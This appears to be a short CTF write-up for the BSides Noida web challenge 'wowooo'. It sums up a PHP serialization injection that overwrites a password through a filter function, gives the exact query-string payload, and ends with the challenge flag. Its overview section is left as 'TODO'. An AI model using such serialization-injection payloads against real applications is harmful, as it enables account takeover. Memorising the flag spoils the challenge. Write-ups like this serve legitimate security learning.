# BSides Noida CTF - wowooo (37 solves)

> it's really interesting
Note : Bruteforce is not required.

**Category**: web

**Given**: 
- [index.php](handouts/index.php): webpage source code (with query parameter `debug=true`)

**Requirements**: N/A

**Solution Files**: [solve.py](solve.py)

**TL;DR**: Use the filter function to inject data outside the serialized string and overwrite the password.

### Overview
TODO

### Exploit
```
?name=flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag%22;i:1;s:19:%22V13tN4m_number_one%20%22;};s:4:%22ssss
```

**Flag**: BSNoida{3z_ch4all_46481684185_!!!!!!@!}